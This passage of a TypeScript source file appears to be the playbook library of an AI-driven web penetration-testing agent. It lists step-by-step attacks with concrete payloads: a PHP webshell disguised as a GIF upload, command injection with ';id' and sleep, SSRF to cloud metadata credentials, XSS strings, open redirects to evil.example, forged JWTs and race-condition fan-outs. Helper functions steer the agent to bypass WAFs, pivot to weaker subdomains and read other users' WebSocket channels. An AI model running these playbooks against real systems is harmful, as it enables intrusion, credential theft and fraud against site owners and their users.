      { id: "blind_script", tool: "exec.python", layer: "strategic", state_out: "/state/sqli_progress.json", purpose: "时间盲注要发几十上百次带 sleep 的请求并逐字符二分：步兵没法把每次的耗时差值算成字符，进沙箱写二分法脚本，进度写 /state 供下一轮续跑。前提是前面 time_probe 已经拿到 timing_delta", input: { code: "# 读 /state/recon/endpoints.json 拿注入点与参数；对每位字符二分 0-127，阈值为 baseline RTT + 1500ms；每猜中一位就 flush 到 /state/sqli_progress.json；发请求一律经 MITM 代理（不要直连）", timeout_s: 240 }, expect: "/state/sqli_progress.json 里有 >8 位已确定的字节或库名片段" },
    ],
    confirm: { evidence: ["diff_arith", "time_probe", "sqlmap"], must_show: "先有表达式求值迹象（arith_probe/diff_arith），或 time_probe 的 verdict=timing_delta（正文相同也算），或 quote_probe 的报错特征；再由 sqlmap 判定 injectable 或 OAST 回连确认。单靠一个引号报 500 不算" },
    stop: ["全部参数加引号后响应一致且无报错", "同一端点连续 2 次被 WAF 拦（403/拦截页）→ 停手，转 waf_bypass 打法（编码/参数/路径/头阶梯），不要在同一路径上继续刷引号", "WAF 稳定拦截且 waf_bypass 各档返回同一拦截指纹（规则级封锁）"],
    report: ["注入点与参数位置（GET/POST/Header/Cookie）", "数据库类型与当前权限", "可读表/条数量级（只取一行证明）"],
  },
  {
    id: "upload_rce",
    deliverables_template: ["upload_endpoint","stored_path","exec_verdict"],
    title: "文件上传 / RCE",
    priority: 5,
    when: ["存在上传接口（avatar/attach/import）", "响应含文件路径", "后台可访问上传目录"],
    timebox_sec: 1200,
    steps: [
      { id: "probe", tool: "http.request", purpose: "先用合法小文件确认接口与字段名", input: { method: "POST", url: "TARGET/uploads", multipart: [{ name: "file", fileName: "a.txt", mimeType: "text/plain", value: "probe" }] }, expect: "返回文件路径或成功标记" },
      { id: "bypass", tool: "http.request", purpose: "绕过扩展名/类型校验（双扩展、大小写、Content-Type、图片马头）", input: { method: "POST", url: "TARGET/uploads", multipart: [{ name: "file", fileName: "shell.php.jpg", mimeType: "image/jpeg", value: "GIF89a<?php echo md5(1); ?>" }] }, expect: "落地为可解析脚本" },
      { id: "verify", tool: "http.request", purpose: "访问上传结果确认解析执行", input: { method: "GET", url: "UPLOADED_URL" }, expect: "返回命令回显（如 md5(1) 结果）" },
    ],
    confirm: { evidence: ["verify"], must_show: "访问上传文件返回命令执行结果，而不是文件源码或被拒绝" },
    stop: ["所有变体均被拒且无落地路径返回", "上传目录不可访问（403 且无旁路）"],
    report: ["上传点与绕过手法链", "落地路径与执行权限（whoami 回显）", "是否可写 webshell 及影响面"],
  },
  {
    id: "cmdi",
    deliverables_template: ["injection_point","time_or_oob_verdict","command_output"],
    title: "命令注入",
    priority: 6,
    when: ["参数是 IP/域名/文件名/模板路径", "功能含 ping/nslookup/convert/export", "响应像命令输出"],
    timebox_sec: 900,
    steps: [
      { id: "echo", tool: "http.request", purpose: "分号/管道/反引号/$() 四种分隔符逐个试回显", input: { method: "GET", url: "TARGET?ip=127.0.0.1;id" }, expect: "响应出现 uid= 输出" },
      { id: "diff_time", tool: "http.diff", purpose: "无回显时用 sleep 造成的耗时差异确认：http.diff 的时间维度已是硬判定，verdict=timing_delta 即成立", input: { url: "TARGET?ip=127.0.0.1", variant: { url: "TARGET?ip=127.0.0.1;sleep%205" }, timing_threshold_ms: 2000 }, expect: "verdict=timing_delta（data.timing.suspect=true，delta_ms≈5000）；正文相同也算成立" },
      { id: "oast", tool: "recon.interactsh", purpose: "完全盲打用 OAST 回连确认", input: { action: "start", wait_seconds: 8 }, expect: "DNS 回调命中" },
      { id: "payload_matrix", tool: "exec.python", layer: "strategic", state_out: "/state/cmdi_matrix.json", purpose: "四种分隔符 × 常见过滤绕过（${IFS}、编码、分号变体）组合有几十种，步兵逐条打太慢：沙箱里批量枚举并把\"哪个 payload 有回显/有延时\"记成矩阵，下一轮只对有反应的那条做确认", input: { code: "# 从 /state/recon/endpoints.json 读注入参数；遍历分隔符与编码组合，每条带 1.5s 超时；有回显或耗时超基线的记进 /state/cmdi_matrix.json", timeout_s: 180 }, expect: "矩阵里至少一条 hit=true（有回显或延时不小于基线+1500ms）" },
    ],
    confirm: { evidence: ["echo", "diff_time"], must_show: "命令输出回显；无回显时 diff_time 的 verdict=timing_delta，或 OAST 回连同样成立" },
    stop: ["全部分隔符被过滤且 sleep 无差异、OAST 无回调"],
    report: ["注入参数与可用分隔符", "执行身份与主机信息（只读）", "是否可横向"],
  },
  {
    id: "ssrf",
    deliverables_template: ["ssrf_param","callback_hit","internal_reach_verdict"],
    title: "SSRF",
    priority: 7,
    when: ["参数是 url/uri/image/webhook/callback/proxy", "功能含导入远程图片、抓取预览、URL 解析", "响应含目标站内容片段"],
    timebox_sec: 900,
    steps: [
      { id: "oast", tool: "recon.interactsh", purpose: "先起 OAST 拿 payload 域名", input: { action: "start", wait_seconds: 8 }, expect: "拿到唯一回连域名" },
      { id: "inject", tool: "http.request", purpose: "把 OAST 域名填进可疑参数", input: { method: "POST", url: "TARGET/fetch", body: { url: "http://OAST_DOMAIN/x" } }, expect: "服务端发起请求" },
      { id: "poll", tool: "recon.interactsh", purpose: "轮询回连结果", input: { action: "poll", wait_seconds: 20 }, expect: "收到 DNS/HTTP 回调" },
      { id: "internal", tool: "http.request", purpose: "内网与云元数据探测（只读）", input: { method: "POST", url: "TARGET/fetch", body: { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" } }, expect: "返回内网内容或云凭证" },
    ],
    confirm: { evidence: ["poll"], must_show: "OAST 收到来自目标的回连；或内网/元数据内容被回显" },
    stop: ["OAST 20 秒无回调且参数被白名单校验", "只回显固定成功文案、body 与基线一致"],
    report: ["注入参数与协议（http/gopher/file）", "可触达的内网段/端口", "云元数据是否可取凭证"],
  },
  {
    id: "deserialization",
    deliverables_template: ["injection_point","gadget_hint","oob_or_error_verdict"],
    title: "反序列化 / 模板注入",
    priority: 8,
    when: ["指纹命中 Shiro rememberMe / Fastjson / Jackson / ViewState / Struts2", "请求带 base64 或二进制序列化字段", "参数进入模板渲染（{{ }}、${ }）"],
    timebox_sec: 1200,
    steps: [
      { id: "fingerprint", tool: "recon.nuclei", purpose: "先确认组件与已知 CVE 模板命中", input: { tags: "shiro,fastjson,struts,viewstate" }, expect: "命中对应 CVE 模板" },
      { id: "oast", tool: "recon.interactsh", purpose: "准备回连确认", input: { action: "start", wait_seconds: 8 }, expect: "拿到 payload 域名" },
      { id: "payload", tool: "http.request", purpose: "投递 gadget 触发 DNS 回连（只做回连证明，不落地）", input: { method: "POST", url: "TARGET", body_base64: "PAYLOAD_BASE64" }, expect: "目标发起回连" },
      { id: "ssti", tool: "http.request", purpose: "模板注入先做算术回显（{{7*7}}/41）", input: { method: "GET", url: "TARGET?name={{7*7}}" }, expect: "回显 49" },
    ],
    confirm: { evidence: ["payload"], must_show: "OAST 回连命中；SSTI 以算术回显成立" },
    stop: ["组件指纹不确定且所有模板探测原样回显", "回连全无且响应无异常"],
    report: ["组件与版本", "触发字段与编码方式", "回连来源 IP 与执行身份"],
  },
  {
    id: "jwt_auth",
    deliverables_template: ["jwt_claim_summary","forged_token_verdict","auth_bypass_verdict"],
    title: "JWT / 认证缺陷",
    priority: 9,
    when: ["Authorization 里是 JWT", "存在 kid/jku/jwk 参数", "更换 alg 后仍有响应"],
    timebox_sec: 600,
    steps: [
      { id: "decode", tool: "recon.jwt", purpose: "解码并跑标准攻击矩阵（none/算法混淆/弱密钥）", input: { token: "TOKEN" }, expect: "工具给出可绕过的变体" },
      { id: "swap", tool: "http.diff", purpose: "用伪造 token 打受保护接口，与原 token 对比", input: { url: "TARGET/api/me", headers: { Authorization: "Bearer FAKE" }, variant: { headers: { Authorization: "Bearer REAL" } } }, expect: "伪造 token 也拿到用户数据" },
    ],
    confirm: { evidence: ["swap"], must_show: "伪造/篡改 token 访问受保护接口返回 200 与真实数据" },
    stop: ["所有变体 401/403", "弱密钥跑完字典无命中"],
    report: ["签名缺陷类型（none/kid 穿越/弱密钥）", "可冒充的角色", "token 有效期与刷新机制"],
  },
  {
    id: "cloud_supply",
    deliverables_template: ["cloud_asset_id","supply_chain_link","takeover_verdict"],
    title: "云与供应链（OSS / 泄露凭证）",
    priority: 10,
    when: ["JS 里出现 AK/SK/S3/OSS 字样", "存在 bucket 域名", "页面引用第三方 CDN/OSS"],
    timebox_sec: 900,
    steps: [
      { id: "secrets", tool: "recon.secrets", purpose: "从 JS/产物里扫泄露凭证", input: { path: "ARTIFACT_DIR" }, expect: "命中 AK/SK/token" },
      { id: "bucket", tool: "http.request", purpose: "bucket 列举测试（只读）", input: { method: "GET", url: "https://BUCKET.oss-cn-hangzhou.aliyuncs.com/?list-type=2" }, expect: "返回对象列表" },
      { id: "meta", tool: "http.request", purpose: "结合 SSRF 取云元数据（无 SSRF 时跳过）", input: { method: "GET", url: "TARGET" }, expect: "拿到临时凭证（只读验证）" },
    ],
    confirm: { evidence: ["bucket"], must_show: "可列举对象或凭证可读资源；不得写/删" },
    stop: ["bucket 返回 AccessDenied 且凭证无效"],
    report: ["可列对象数量与敏感文件名", "凭证权限边界（只读证明）", "受影响业务"],
  },
  {
    id: "logic",
    deliverables_template: ["business_flow","abuse_state","logic_flaw_verdict"],
    title: "业务逻辑漏洞",
    priority: 11,
    when: ["存在领券/下单/提现/积分/改密/绑定手机", "价格与数量由前端传（仅作参考，后端多半会重算）", "有回调与状态机（订单/工单/审核流）"],
    timebox_sec: 1500,
    steps: [
      { id: "map_flow", tool: "burp.history", purpose: "先把一条完整业务链的调用顺序导出来（领券→下单→支付→发货），按时间列出 URL、方法、关键字段名", input: { limit: 50 }, expect: "拿到 3–6 个有序接口及其字段名（orderId/status/payType/couponId）", next: ["replay_normal"] },
      { id: "replay_normal", tool: "http.request", purpose: "按原顺序单独重放最关键的一步，记录正常状态基线（订单状态/库存/余额）", input: { method: "POST", url: "STEP_URL", body: {} }, expect: "得到正常响应与状态快照", next: ["skip_step", "tamper_state"] },
      { id: "skip_step", tool: "http.request", purpose: "状态机跳跃：省略中间步骤，直接调最后一步（不付钱直接调发货/确认收货/回调）——这是改 price 改不出来的洞", input: { method: "POST", url: "FINAL_STEP_URL", body: {} }, expect: "跳过支付仍然成功（订单进入已支付/已发货）", next: ["diff_effect"], when: "map_flow 显示存在 ≥3 步状态机时优先走这条" },
      { id: "tamper_state", tool: "http.request", purpose: "参数污染：在请求里多塞状态字段（status=paid / step=4 / paid=true），服务端若直接采信客户端状态即为逻辑漏洞", input: { method: "POST", url: "STEP_URL", body: { status: "paid", step: 4, paid: true } }, expect: "服务端接受客户端给的 status/step，状态被改写", next: ["reorder"] },
      { id: "reorder", tool: "http.request", purpose: "乱序重放：先调后置接口再调前置接口（先确认收货再取消订单），看服务端是否只按参数而不按状态校验", input: { method: "POST", url: "LATER_STEP_URL", body: {} }, expect: "非法顺序被接受，或后置结果覆盖前置状态", next: ["diff_effect"] },
      { id: "diff_effect", tool: "http.diff", purpose: "把改动前后同一个查询接口做结构化对比，确认是服务器状态真的变了（不是回显）", input: { url: "TARGET_STATE", variant: { url: "TARGET_STATE" } }, expect: "订单/库存/余额出现客户端不应能达到的状态" },
    ],
    confirm: { evidence: ["diff_effect"], must_show: "跳过或乱序调用后服务器状态真的进入非法态（未支付变已发货、库存被重复扣、券被重复领），由 diff_effect 证明；只接受客户端改 price/status 的回显不算" },
    stop: ["后端对每个状态迁移都校验前置状态（跳过/乱序一律 400）", "业务链只有一步、没有可跳跃的状态机"],
    report: ["被跳过的步骤与仍然成功的接口", "非法状态迁移后的实际影响（发货/退款/库存）", "可重复性（重放一次即停手）"],
  },
  {
    id: "race_condition",
    deliverables_template: ["concurrent_requests","duplicate_success_count","race_verdict"],
    title: "并发竞争 / 竞态（状态机扇出）",
    priority: 12,
    when: ["秒杀 / 限量 / 库存扣减 / 优惠券领取", "余额提现、积分兑换、红包", "任何「只能成功一次」的动作"],
    timebox_sec: 900,
    steps: [
      { id: "baseline", tool: "http.request", purpose: "正常做一次，记录被消耗资源的当前值（库存/余额/券数）与状态码", input: { method: "GET", url: "STATE_URL" }, expect: "拿到基线数值", next: ["lock_state"] },
      { id: "lock_state", tool: "http.request", purpose: "把资源推进到「可被并发消耗」的前置状态（加购/下单/待支付）", input: { method: "POST", url: "PREPARE_URL", body: {} }, expect: "前置状态建立（订单号/预留标记）", next: ["fanout"], when: "前置失败就回 baseline 换目标，别硬打" },
      { id: "fanout", tool: "recon.race_condition", layer: "tactical_rpc", purpose: "同一请求并发 N 份（一次扇出，不是循环串行）：控制面预建 N 条连接后同时写，返回里有 sent_at 与 spread_ms 能自证并发成立（实测 20 发跨度 1–3ms）。沙箱里写 Python 并发会被代理排队抹平，串行循环更不算。burp.send_batch 可作备选，但它不回发送时刻，无法证明同一毫秒到达", input: { url: "CONSUME_URL", method: "POST", body: {}, count: 20, requests: [{ method: "POST", path: "/CONSUME_PATH", body: {} }] }, expect: "多个请求同时到达（spread_ms < 50），出现 2 次以上成功", concurrency: 20, next: ["diff_effect"] },
      { id: "diff_effect", tool: "http.diff", purpose: "对比并发前后的资源值，确认被消耗了多次", input: { url: "STATE_URL", variant: { url: "STATE_URL" } }, expect: "库存/余额按成功次数被扣减多次，或券被领取多张", next: ["confirm_repeat"] },
      { id: "confirm_repeat", tool: "http.request", purpose: "复查最终状态并记录成功次数（成功一次即停手，不做破坏性放大）", input: { method: "GET", url: "STATE_URL" }, expect: "结论明确：成功 N 次 / 影响量级" },
    ],
    confirm: { evidence: ["fanout", "diff_effect"], must_show: "同一资源被并发消耗多次（库存超扣、券超领、余额多扣），diff_effect 显示前后数值按成功次数变化；串行循环打出的多份成功不算" },
    stop: ["并发全被行锁/幂等键挡住（只成功 1 次）", "前置状态无法建立"],
    report: ["并发度与成功次数", "被重复消耗的资源与量级（一次为限）", "是否具备幂等键/分布式锁"],
  },
  {
    id: "graphql_ws",
    deliverables_template: ["schema_dump","operation_result","abuse_verdict"],
    title: "GraphQL / WebSocket",
    priority: 13,
    when: ["存在 /graphql 端点", "前端用 WS 订阅（wss://）", "响应含 __schema"],
    timebox_sec: 900,
    steps: [
      { id: "introspect", tool: "recon.graphql", purpose: "introspection + 批量查询 + 越权探测", input: {}, expect: "拿到完整 schema 或批量查询命中" },
      { id: "query", tool: "http.request", purpose: "手工查敏感字段（users/orders/tokens）", input: { method: "POST", url: "TARGET/graphql", body: { query: "{ users { id email role } }" } }, expect: "返回本不该可见的字段" },
      { id: "ws", tool: "browser.open", purpose: "WS 握手与订阅他人 channel（在页面里验证）", input: { url: "TARGET", evaluate: "typeof WebSocket" }, expect: "订阅到他人消息或未校验 token" },
      { id: "ws_client", tool: "exec.python", layer: "strategic", state_out: "/state/ws_subscriptions.json", purpose: "浏览器里只能验证握手，要证明\"订阅了别人的频道并收到数据\"需要长连接多路订阅：沙箱里用 websockets 客户端带他人 token 订阅 N 个 channel，把收到的消息落盘", input: { code: "# pip 依赖 websockets；用从 /state/tokens.json 读到的 token 订阅目标 channel 列表，逐条记录是否收到 server 推送；超时 60s 收尾", requirements: ["websockets"], timeout_s: 120 }, expect: "/state/ws_subscriptions.json 里有来自他人 channel 的消息体" },
    ],
    confirm: { evidence: ["query"], must_show: "未授权查询返回敏感字段，或 WS 订阅到他人频道数据" },
    stop: ["introspection 关闭且无可用查询", "所有查询都要求有效 token"],
    report: ["schema 暴露面", "越权字段与数据量", "WS 是否校验 token"],
  },
  {
    id: "xss",
    deliverables_template: ["injection_context","payload_echo","exec_verdict"],
    title: "XSS（反射/存储/DOM）",
    priority: 14,
    when: ["参数回显到 HTML", "前端用 location/hash/innerHTML", "存在富文本/昵称/评论"],
    timebox_sec: 900,
    steps: [
      { id: "reflect", tool: "http.request", purpose: "先看参数是否原样回显（含编码情况）", input: { method: "GET", url: "TARGET?q=<script>alert(1)</script>" }, expect: "回显未编码或部分编码" },
      { id: "dalfox", tool: "recon.xss", purpose: "自动化确认与上下文判断", input: { url: "TARGET?q=1" }, expect: "dalfox 报 verified" },
      { id: "dom", tool: "browser.open", purpose: "DOM 型在浏览器里 evaluate 验证执行", input: { url: "TARGET#<img src=x onerror=alert(1)>", evaluate: "document.title" }, expect: "onerror 触发（标题/弹窗变化）" },
      { id: "blind", tool: "recon.interactsh", purpose: "盲打存储型用 OAST 回连", input: { action: "start", wait_seconds: 8 }, expect: "收到回连" },
    ],
    confirm: { evidence: ["dalfox", "dom"], must_show: "浏览器里实际执行（DOM 变化/回调），不是仅字符串回显" },
    stop: ["全站输出编码且 CSP 阻断内联", "只回显在属性里且被严格转义"],
    report: ["触发点与上下文（HTML/属性/JS/URL）", "执行位置（反射/存储/DOM）", "是否需要交互（存储型影响面）"],
  },
];

export const PLAYBOOK_IDS = PLAYBOOKS.map(playbook => playbook.id);
const byId = new Map(PLAYBOOKS.map(playbook => [playbook.id, playbook]));

/** 别名归一，模型写中文或简写也能命中。 */
export function playbookById(id: string): Playbook | undefined {
  const key = String(id || "").trim().toLowerCase();
  if (!key) return undefined;
  const normalized: Record<string, string> = {
    unauth: "unauth_exposure", "unauthorized": "unauth_exposure", exposure: "unauth_exposure", info_leak: "unauth_exposure",
    privilege: "idor", "broken_access_control": "idor", bac: "idor", 越权: "idor", 未授权: "unauth_exposure",
    sql: "sqli", sqlinjection: "sqli", upload: "upload_rce", rce: "upload_rce", command_injection: "cmdi", cmdinj: "cmdi",
    ssrf: "ssrf", jwt: "jwt_auth", auth: "jwt_auth", cloud: "cloud_supply", oss: "cloud_supply",
    business_logic: "logic", graphql: "graphql_ws", websocket: "graphql_ws", xss: "xss",
    waf: "waf_bypass", wafbypass: "waf_bypass", bypass_waf: "waf_bypass", 绕waf: "waf_bypass", 绕过waf: "waf_bypass", 绕_waf: "waf_bypass",
  };
  return byId.get(key) || byId.get(normalized[key] || "");
}

/** 按优先级排序的 playbook 列表。 */
export function orderedPlaybooks(): Playbook[] {
  return [...PLAYBOOKS].sort((a, b) => a.priority - b.priority);
}

/**
 * 根据指纹/接口线索推荐该先打哪些 playbook（保持优先级顺序）。
 * 线索都是小写子串匹配，宁可多推荐，模型自己收敛。
 */
export function recommendPlaybooks(signals: { fingerprints?: string[]; urls?: string[]; notes?: string[] }): Playbook[] {
  const haystack = [...(signals.fingerprints || []), ...(signals.urls || []), ...(signals.notes || [])].join(" ").toLowerCase();
  const rules: Array<[RegExp, string[]]> = [
    // 统一 10403/401、或站点有登录/SSO：先走"浏览器取 Token → HTTP 打业务"这条链，
    // 否则剩下的全是匿名遍历，永远进不了业务层。
    [/10403|10401|未登录|token\s*(错误|失效|无效)|unauthorized|forbidden|not\s*logged|\/login|\/sso|\/oauth|authorize|passport|\/cas\/|gettoken|signin|auth\/|mfa|两步验证|验证码|captcha/i, ["auth_token"]],
    [/actuator|spring|swagger|api-docs|druid|nacos|eureka|\/env\b|heapdump|\.git\/config|\.env\b/, ["unauth_exposure"]],
    [/ruoyi|若依|fanrui|帆软|yonyou|用友|seeyon|泛微|kingdee|金蝶/, ["unauth_exposure", "sqli"]],
    // RESTful 路径即 id、驼峰/下划线对象 id、以及 JSON Body 里的 id 字段
    [/(^|[^a-z])\/\d{1,12}(\/|\?|$)|%2f\d{1,12}|\{id\}|\:id\b|\/(users?|orders?|docs?|files?|members?|accounts?)\/[^\/\s]+/i, ["idor"]],
    [/userid|orderid|tenantid|roleid|memberid|docid|fileid|accountid|uid=|openid|"id"\s*:\s*\d|"user_?id"\s*:|"owner"\s*:|idcard|objectid/i, ["idor"]],
    [/\.jsp|\.php|\.aspx|\?id=|\?id_|\?key=|\?keyword=|orderby|order\s*by|\bsort=|\bunion\b|\bselect\b.*\bfrom\b|sleep\(|benchmark\(/i, ["sqli"]],
    [/upload|avatar|attach|import|multipart|filename=|file\s*type/i, ["upload_rce"]],
    [/graphql|__schema|wss:\/\/|subscription|introspection/i, ["graphql_ws"]],
    [/jwt|authorization:\s*bearer|eyj|access_token|refresh_token|id_token/i, ["jwt_auth"]],
    [/bucket|oss-|oss\.|s3\.amazonaws|s3\.|cdn\.|storage\.|minio|objectstorage|obs\./i, ["cloud_supply"]],
    [/pay|order|cart|coupon|withdraw|balance|score|point|integral|sign|invite|redeem|discount/i, ["logic"]],
    [/race|concurren|stock|inventory|seckill|flashsale|库存|秒杀|限量|only.?once|once.?per/i, ["race_condition"]],
    [/shiro|rememberme|fastjson|struts|viewstate|jackson|rO0AB|java\.io\.serializable/i, ["deserialization"]],
    [/url=|uri=|callback=|webhook=|image=|fetch\?|redirect=|target=|dest=|proxy=|return_url|next=/i, ["ssrf"]],
    [/ping|nslookup|traceroute|tracert|export|convert|exec|system\(|popen/i, ["cmdi"]],
    [/search|keyword=|q=|query=|<script|comment|nickname|feedback|message=/i, ["xss"]],
  ];
  const picked = new Set<string>();
  for (const [pattern, ids] of rules) if (pattern.test(haystack)) ids.forEach(id => picked.add(id));
  if (!picked.size) picked.add("unauth_exposure");
  return orderedPlaybooks().filter(playbook => picked.has(playbook.id));
}

/**
 * POST 功能面兜底任务。
 *
 * 推荐器只对已发现的 URL/notes 做正则，站点没有 upload/import/export/ping 这些字样时
 * upload_rce/cmdi/ssrf/logic 永远不会被推荐 —— 整个会话就只剩 GET。
 * 发现面够大、却一条 POST 型打法都没跑过时，这里给出一条具体的“方法面枚举”任务。
 */
export function postSurfaceTask(
  state: { tasks?: Record<string, unknown>; endpoints?: Record<string, unknown>; playbook_runs?: Record<string, PlaybookRun> },
  stamp: string,
): { id: string; target: string; purpose: string; reason: string; completion_criteria: string } | undefined {
  const tasks = state.tasks || {};
  if (Object.keys(tasks).some(id => id.startsWith("post_surface_"))) return undefined;
  const discovered = Object.keys(state.endpoints || {}).length;
  if (discovered < 10) return undefined;
  const runs = state.playbook_runs || {};
  if (["upload_rce", "cmdi", "ssrf", "logic"].some(id => (runs[id]?.calls || 0) > 0)) return undefined;
  return {
    id: `post_surface_${stamp}`,
    target: "TARGET_ROOT",
    purpose: "枚举 POST 功能面：对匿名可读接口比对 OPTIONS/405，从 JS 与 Swagger 里找 method:post 及其字段名",
    reason: `已发现 ${discovered} 条入口但 upload_rce/cmdi/ssrf/logic 一次都没跑过：需要先把 POST 面找出来`,
    completion_criteria: "列出 ≥3 个真实 POST 端点及字段名，或证明该站只有 POST 登录面（附证据）",
  };
}

type LinkageState = {
  tasks?: Record<string, unknown>;
  playbook_runs?: Record<string, PlaybookRun>;
  tool_calls?: Record<string, number>;
  endpoints?: Record<string, unknown>;
};

/**
 * 无回显打法（SSRF / cmdi / 反序列化）开始跑却从没起过 interactsh：
 * 结果只能是"疑似"，永远到不了"确认"。这里投一条挂 OAST 的任务。
 */
export function oastRequiredTask(state: LinkageState, stamp: string) {
  if ((state.tool_calls?.["recon.interactsh"] || 0) > 0) return undefined;
  const runs = state.playbook_runs || {};
  const blind = ["cmdi", "ssrf", "deserialization"].filter(id => (runs[id]?.calls || 0) > 0);
  if (!blind.length) return undefined;
  if (Object.keys(state.tasks || {}).some(id => id.startsWith("oast_required_"))) return undefined;
  return {
    id: `oast_required_${stamp}`,
    target: "OAST",
    purpose: "先 recon.interactsh start 拿回调域名，把它填进 ssrf/cmdi/盲注参数，再 poll 确认回调",
    reason: `${blind.join("/")} 已经在跑但 interactsh 一次没启动：无回显漏洞没法确认`,
    completion_criteria: "至少一次 DNS/HTTP 回调命中，或说明该打法为什么不需要 OAST",
  };
}

/**
 * 爬完之后没跑 Burp 扫描：被动扫描能覆盖大量模板打不到的已知问题，
 * 且 Burp 的 issues 是把"疑点"变成"可复现"的低成本来源。
 */
export function burpScanTask(state: LinkageState, stamp: string) {
  if ((state.tool_calls?.["burp.scan"] || 0) > 0) return undefined;
  const crawled = (state.tool_calls?.["katana.crawl"] || 0) + (state.tool_calls?.["burp.sitemap"] || 0);
  if (!crawled) return undefined;
  const endpoints = Object.keys(state.endpoints || {}).length;
  if (endpoints < 5) return undefined;
  if (Object.keys(state.tasks || {}).some(id => id.startsWith("burp_scan_"))) return undefined;
  return {
    id: `burp_scan_${stamp}`,
    target: "TARGET_ROOT",
    purpose: `对已爬到的 ${endpoints} 条入口跑 burp.scan，读 issues 并逐条用 http.request 复核`,
    reason: "爬虫已产出入口但没有跑过 Burp 扫描：已知问题类型（注入/泄露/配置）会漏",
    completion_criteria: "拿到 issues 列表并对每条给出复核结论（confirmed / false positive）",
  };
}

type AnomalySpec = { id: string; target: string; purpose: string; reason: string; completion_criteria: string; playbook?: string };

/**
 * 异常响应的利用型任务。目标全站跳到同一个地方时，值钱的不是继续扫目录，而是：
 * Host 头能否改写跳转、跳转目标能否被外部控制、跳转目标子域能否被接管。
 */
export function anomalyTasks(alert: { kind: string; host: string; location?: string }, stamp: string): AnomalySpec[] {
  const where = alert.location ? `${alert.host} 统一跳转到 ${alert.location}` : `${alert.host} 全站响应体同长度（catch-all 路由）`;
  return [
    {
      id: `host_header_injection_${stamp}`,
      target: `https://${alert.host}/`,
      purpose: `对 ${alert.host} 发伪造 Host / X-Forwarded-Host / X-Forwarded-For 头的请求，并用 http.diff 对比默认 Host 与伪造 Host 的 Location/正文差异`,
      reason: `异常响应：${where}`,
      completion_criteria: "必须给出 http.diff 对比证据（默认 Host vs 伪造 Host 的 Location 或缓存键不同）；只发一次伪造包不算验证",
      playbook: "unauth_exposure",
    },
    {
      id: `open_redirect_${stamp}`,
      target: `https://${alert.host}/`,
      purpose: "在跳转参数上试 //evil.example、/\\evil.example、?next=http://evil.example、%2F%2Fevil.example、@evil.example，并用 http.diff 对比带/不带恶意参数的 Location",
      reason: `异常响应：${where} —— 跳转目标若来自参数即为开放重定向`,
      completion_criteria: "必须给出 http.diff 证据：带恶意参数时 Location 指向外部域、不带时指向站内；单看一次 302 不算",
      playbook: "logic",
    },
    {
      id: `takeover_check_${stamp}`,
      target: alert.location || `https://${alert.host}/`,
      purpose: "对跳转目标子域做 CNAME/NS 查询判断悬垂记录，并用 http.diff 对比直连该子域与带 Host 头访问的响应差异",
      reason: `异常响应：${where} —— 跳转目标若是可接管子域，等于拿到信任链的一环`,
      completion_criteria: "必须给出 DNS 证据（CNAME 链）＋ http.diff 证据（直连 vs 带 Host 头），结论写明可接管/不可接管",
      playbook: "cloud_supply",
    },
  ];
}

/**
 * 攻击面降级（Plan B）：当前 host 被 WAF / 强鉴权挡住时别在原地死磕，
 * 把战场搬到防御更薄的地方——子域、旧版 API、移动端专用接口。
 */
export function lateralEscapeTask(host: string, stamp: string, hints: { oldVersions?: string[] } = {}): AnomalySpec {
  const old = hints.oldVersions?.length
    ? `旧版接口：${hints.oldVersions.slice(0, 4).join("、")}`
    : "旧版接口：把路径里的 /v2/ 换成 /v1/、/v0/、/internal/ 各试一次";
  return {
    id: `lateral_escape_${stamp}`,
    target: `https://${host}/`,
    purpose: `${host} 已被 WAF/强鉴权挡住：先用 recon.subdomains 找同族边缘资产，再在同一 API 上试旧版本与移动端前缀（${old}；移动端前缀 /api/app/、/api/mobile/、/app/），逐条记录状态码与业务码`,
    reason: "攻击面降级：主站防御最厚，边缘资产与旧版本通常没有同等防护，横向逃逸比硬碰更划算",
    completion_criteria: "给出至少 3 个边缘资产或替代路径的探测结论（状态码/业务码/是否同样被 WAF 拦），并指出哪条防御更薄；不要只在原 host 上换参数",
    playbook: "unauth_exposure",
  };
}

/**
 * WAF 阶梯任务：拦截出现时**先派这一条**，再考虑 lateral_escape。
 *
 * 顺序理由（2026-10-30 qwen 一轮的教训）：主站被 412 挡后直接派横向逃逸，
 * 等于把"规则级可绕"判成"永久封锁"，最后只能交白卷。
 */
export function wafBypassTask(host: string, stamp: string, hints: { marker?: string; path?: string; replay?: string } = {}): AnomalySpec {
  const where = hints.path ? `${host}${hints.path}` : host;
  const replay = String(hints.replay || "").trim();
  return {
    id: `waf_bypass_${stamp}`,
    target: `https://${host}/`,
    purpose: `对 ${where} 跑 waf_bypass 阶梯：先取拦截基线指纹（status+bytes+body_sha256，两次一致才算 WAF），再按编码 → 参数污染 → 路径/方法/头伪装 → 原始报文/分块逐档试，命中的变体落成 http.diff 对照${replay ? `。**战例库已有同类墙的打穿记录，第一步是原样复刻下面这条变体（http.diff 与 baseline 对照），复刻失败才逐档枚举**：\n${replay}` : ""}`,
    reason: `${where} 已连续返回拦截响应${hints.marker ? `（${hints.marker}）` : ""}：直接换 host 等于放弃一堵可绕的规则墙，${replay ? "先复刻战例库里的成功变体，" : ""}再用阶梯判定是规则级还是语义级封锁`,
    completion_criteria: "产出一条打穿变体（含 baseline/hit 的 http.diff 对照与 wall fingerprint），并把该变体回报进 waf_bypasses（vendor/dimension/tactic/payload/evidence_id），或阶梯跑满且各档返回同一拦截指纹（三项一致）后再转 lateral_escape",
    playbook: "waf_bypass",
  };
}

/**
 * 跨域 JS SDK：页面引用了别的域名（尤其 id/auth/login/sso/api 这类）时，
 * 那是信任链的延伸，不是"顺手记一下"的噪音，要单独派任务。
 */
export function crossDomainTasks(host: string, stamp: string): AnomalySpec[] {
  const identity = /(^|[.-])(id|auth|login|sso|passport|account|api)([.-]|$)/i.test(host);
  return [{
    id: `cross_domain_${identity ? "identity" : "asset"}_${stamp}`,
    target: `https://${host}/`,
    purpose: `把跨域 JS 来源 ${host} 当独立资产做测绘：直接打它的接口/文档/actuator，并提取 JS 里的硬编码 key 与登录接口`,
    reason: `主站 JS 引用了第三方域 ${host}${identity ? "（身份/认证类域名，通常是统一认证中心）" : ""}：跨域 SDK 意味着信任链外延`,
    completion_criteria: `给出 ${host} 的可访问面清单（状态码 + 业务码）或明确的鉴权结论`,
    playbook: identity ? "auth_token" : "unauth_exposure",
  }];
}

/** 提示词用的紧凑索引：每行一个 playbook，包含步骤与确认条件。 */
export function playbookIndex(): string {
  const linear = orderedPlaybooks().map(playbook =>
